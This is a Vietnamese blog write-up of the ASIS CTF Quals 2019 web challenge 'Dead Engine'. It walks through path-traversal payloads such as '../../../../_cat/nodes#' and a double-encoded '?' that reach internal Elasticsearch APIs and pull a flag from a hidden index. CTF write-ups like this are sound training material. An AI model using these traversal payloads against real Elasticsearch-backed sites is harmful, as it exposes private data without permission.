---
layout: post
comments: true
title: ASIS CTF Quals 2019
categories: ['2019']
---
Chắc cũng cả tháng rồi mình chưa chơi CTF, lo bận ăn hành của mấy anh ở chỗ làm mới, nay mới có dịp chơi lại. 


![alt text](https://raw.githubusercontent.com/matuhn/matuhn.github.io/master/_posts/Screenshot_2.png "ASIS CTF Quals 2019")

# Dead Engine (WEB)
[Link Challenge](http://192.241.183.207/)

Sau khi lọ mọ bài web warm up, bài này bài kia, không ra được bài nào thì mình thấy nó có release cái challenge mới này thì mình cũng vào xem thử, bài này thì cũng chỉ cho mỗi cái ô search y chang Google và bắt mình kiếm flag :(

Source Code:

```javascript
<script src="jquery-3.2.1.min.js"></script>
<script>

$(document).ready(function() {
    $(document).keypress(function(e) {
        if(e.which == 13) {
            var q = $('.q').val()

            $.post('?action', {q: q, endpoint: 'search'}, function(data){

                if(data.charCodeAt(0)===10 || data===''){
                    $('#res').remove()
                    $('#result').append('<div id="res"></div>')
                    $('#res').append('Results not found.')
                    $('#res').append('<br>')
                }
                else if(data=='index_not_found_exception'){
                    $('#result').text('Something went wront, please try again')
                }else if (data=='illegal_argument_exception'){
                    $('#res').remove()
                    $('#result').append('<div id="res"></div>')
                    $('#res').append('Error while searching')
                    $('#res').append('<br>')
                }else{
                    var obj = JSON.parse(data)
                    
                    $('#res').remove()
                    for(result of obj){
                        $('#result').append('<div id="res"></div>')
                        $('#res').append('<a idParam=' + result._id + ' id="link" href="' + result.downloadLink + '" target="_blank">' + result.title + '</a>')
                        $('#res').append('<br>')
                    }
                }


                $('a[href]').click(function(event){
                    event.preventDefault();
                    var articleID = $(this).attr('idParam')
                    console.log(articleID)

                    $.post('?action', {id: articleID}, function(data){
                        console.log(data)
                    })
                })


            })
        }
    })
});
```

Ngồi fuzz thử XSS, RCE, đủ thứ trên trời dưới đất thì mình dừng ở `q=*&endpoint=search`
Reponse:
```
HTTP/1.1 200 OK
Date: Sun, 21 Apr 2019 11:33:42 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 868
Connection: close
Content-Type: text/html; charset=UTF-8

[{"title":"Test hack password ctf","_id":"AWoSY9ipLaY_ZeX1ck7_","_type":"articles","downloadLink":"https:\/\/127.0.0.1\/"},{"title":"CompTIA Network+","_id":"AWoSY9iqLaY_ZeX1ck8B","_type":"articles","downloadLink":"https:\/\/www.amazon.com\/CompTIA-Network-Certification-Seventh-N10-007\/dp\/1260122387"},{"title":"Cracking Codes with Python","_id":"AWoSY9iqLaY_ZeX1ck8A","_type":"articles","downloadLink":"https:\/\/www.amazon.com\/Cracking-Codes-Python-Introduction-Building\/dp\/1593278225"},{"title":"The Web Application Hacker's Handbook","_id":"AWoSY9ieLaY_ZeX1ck79","_type":"articles","downloadLink":"https:\/\/www.amazon.co.uk\/Web-Application-Hackers-Handbook-Exploiting\/dp\/1118026470"},{"title":"Red Team Field Manual","_id":"AWoSY9iiLaY_ZeX1ck7-","_type":"articles","downloadLink":"https:\/\/www.amazon.co.uk\/Rtfm-Red-Team-Field-Manual\/dp\/1494295504"}]
```

Mình thử cho nó forward qua bên trình duyệt xem thế nào thì các link đều không return gì nhưng có thứ khiến mình chú ý là 
Ví dụ khi mình click vào 1 link bất kì, request gửi đi có dạng 

```
POST /?action HTTP/1.1
Host: 192.241.183.207
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://192.241.183.207/
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 23
Connection: close

id=AWoSY9h7LaY_ZeX1ck78
```

Và reponse sẽ có dạng 
```
HTTP/1.1 200 OK
Date: Sun, 21 Apr 2019 11:37:28 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 99
Connection: close
Content-Type: text/html; charset=UTF-8

"{\"_index\":\"articles\",\"_type\":\"articles\",\"_id\":\"AWoSY9h7LaY_ZeX1ck78\",\"found\":false}"
```

Hmm, tên bài là Dead Engine và đống reponse này có dạng như kiểu serialize nên mình quyết định quăng vào Google keyword như sau :)))
 `{\"_index\":\"articles\",\"_type\ search engine`
Thế ra bài này là về elastic search (daed engine) 

Vậy thì việc còn lại là đi đọc docs thôi, mình cũng nghĩ tới việc đọc CVEs của nó nhưng mà đọc không hiểu gì hết :)))

Để đọc hiểu về Elastic Search thì mình đọc 2 bài này 

https://viblo.asia/p/elasticsearch-distributed-search-ZnbRlr6lG2Xo
https://viblo.asia/p/phan-2-crud-va-search-trong-elasticsearch-3P0lPOvGZox

Đầu tiên là mình phải tìm ra được các api của bài này nó nằm ở đâu, api là rất quan trọng với elastic search vì nó giúp tổ chức các thông tin lưu trữ của elastic như mysql 

Và cái mình cần tìm là cái này 
https://www.elastic.co/guide/en/elasticsearch/reference/current/cat.html

Cái api `_cat` này như kiểu SELECT trong mysql, nó sẽ giúp mình xem thông tin các nodes, các shards, health của nodes,.... 
Mà 1 nodes thì cũng như là trung tâm của việc lưu trữ dữ liệu, có được thông tin các nodes có lẽ cũng giúp được gì đó 

Để xem thông tin của nodes thì mình phải dùng _cat/nodes

`q=a&endpoint=_cat/nodes`
Reponse: 
`Error while JSON decoding:No handler found for uri [/articles/articles/__cat/nodes?q=a] and method [GET]`

Nói dễ hiểu thì mình đang route `/articles/articles/_` , nên khi param endpoint nhận giá trị là `search` ta vô tình gọi api `_search` elastic. Vậy nên mình thử xem ở route này có api cat ko 

`q=a&endpoint=cat/nodes`
Reponse:
`Error while JSON decoding:No handler found for uri [/articles/articles/_cat/nodes?q=a] and method [GET]`

Trước tiên là, chưa chắc ở đây có api cat hay không và thứ 2 là phần backend auto concat thêm phần giá trị param q được set bởi request nên mình cần escape chỗ này lại 

`q=a&endpoint=cat/nodes#`
Reponse:
`Error while JSON decoding:No handler found for uri [/articles/articles/_cat/nodes] and method [GET]`

Vậy là đã escape được param `q=` và biết được ở đây không có api `_cat`, mình giải quyết bằng cách leo lên các dir khác, nhảy lên bao nhiêu thì tùy vào nhân phẩm nữa :))) 

`q=a&endpoint=../../../../_cat/nodes#`
Reponse:
`Error while JSON decoding:127.0.0.1 7 96 0 0.00 0.00 0.00 mdi * Cluster_01_Node_001`

Nhảy lên 4 dir thì có api cat được gọi ra, vậy thì mình biết được nodes là `Cluster_01_Node_001` và cũng không có gì đặc biệt ở đây 
Vậy thì mình sẽ xem tiếp các shards (Theo như mình đọc thì thường chúng ta không làm việc trực tiếp với các shards vì nó chỉ là 1 phần rất nhỏ tạo nên nodes)

`q=a&endpoint=../../../../_cat/shards#`
Reponse:
```
Error while JSON decoding:articles   4 p STARTED    1 7.5kb 127.0.0.1 Cluster_01_Node_001
articles   4 r UNASSIGNED                   
articles   3 p STARTED    1 7.7kb 127.0.0.1 Cluster_01_Node_001
articles   3 r UNASSIGNED                   
articles   2 p STARTED    1 7.6kb 127.0.0.1 Cluster_01_Node_001
articles   2 r UNASSIGNED                   
articles   1 p STARTED    2 8.2kb 127.0.0.1 Cluster_01_Node_001
articles   1 r UNASSIGNED                   
articles   0 p STARTED    0  191b 127.0.0.1 Cluster_01_Node_001
articles   0 r UNASSIGNED                   
secr3td4ta 4 p STARTED    1 4.4kb 127.0.0.1 Cluster_01_Node_001
secr3td4ta 4 r UNASSIGNED                   
secr3td4ta 3 p STARTED    0  191b 127.0.0.1 Cluster_01_Node_001
secr3td4ta 3 r UNASSIGNED                   
secr3td4ta 1 p STARTED    0  191b 127.0.0.1 Cluster_01_Node_001
secr3td4ta 1 r UNASSIGNED                   
secr3td4ta 2 p STARTED    0  191b 127.0.0.1 Cluster_01_Node_001
secr3td4ta 2 r UNASSIGNED                   
secr3td4ta 0 p STARTED    0  191b 127.0.0.1 Cluster_01_Node_001
secr3td4ta 0 r UNASSIGNED                   
```

Ở đây mình sẽ thấy các shards là articles và secr3td4ta, OK vậy là mình gần tới đích rồi :)))
Để đọc được nội dung của `secr3td4ta` thì mình có api _search 
https://www.elastic.co/guide/en/elasticsearch/reference/6.4/search-search.html

vì 2 shards articles và secr3td4ta là cùng 1 level với nhau nên tổ chức thư mục chắc cũng ngang cấp với nhau nên mình có được request

`q=a&endpoint=../../../../secr3td4ta/_search#`
Reponse:
`[{"title":"Flag Is Here, Grab it :)","_id":"AWoSY9h7LaY_ZeX1ck78","_type":"fl4g?","downloadLink":null}]`

Để hiểu được cách serialize của elastic thì mình nghĩ nên đọc 2 link này 

https://www.elastic.co/guide/en/elasticsearch/reference/current/mapping-id-field.html
https://www.elastic.co/guide/en/elasticsearch/reference/current/mapping-type-field.html

Sắp xếp lại mọi thứ thì để đọc data của `secr3td4ta` thì data phải có dạng shards/type/id

`secr3td4ta/fl4g?/AWoSY9h7LaY_ZeX1ck78`

Cùng với đó là quay lại những reponse ban đầu writeup mình có nhắc tới khi mình request với `id=AWoSY9h7LaY_ZeX1ck78` mình sẽ nhận được `"{\"_index\":\"articles\",\"_type\":\"articles\",\"_id\":\"AWoSY9h7LaY_ZeX1ck78\",\"found\":false}"` 

Vậy để xem được output thì mình phải POST tất cả lên với param id, và tất nhiên phải leo lên 5 directory vì directory default của challenge là ở shard `articles` 

payload : 
`id=../../../../../secr3td4ta/fl4g?/AWoSY9h7LaY_ZeX1ck78`

Nhưng vẫn chưa ra flag, mình tìm hiểu thì dấu ? trong eslastic cũng được dùng như 1 kí tự wildcard. Nên mình nghĩ nếu để nguyên dấu chấm hỏi trong query thì query sẽ có vấn đề. Nên mình quyết định thử urlencode dấu ? lên, còn vì sao encode đến lần thứ 2 mới ra thì mình cũng không biết nữa :))

Payload:
`id=../../../../../secr3td4ta/fl4g%253f/AWoSY9h7LaY_ZeX1ck78`

Reponse:
`"{\"_index\":\"secr3td4ta\",\"_type\":\"fl4g?\",\"_id\":\"AWoSY9h7LaY_ZeX1ck78\",\"_version\":1,\"found\":true,\"_source\":{\"title\":\"Flag Is Here, Grab it :)\",\"flag\":\"ASIS{2a6e210f10784c9a0197ba164b94f25d}\"}}"` 

Cảm ơn mọi người vì đã đọc, writeup của mình/em luôn hơi dài vì mình/em muốn chia sẻ những gì học được hơn là cách giải






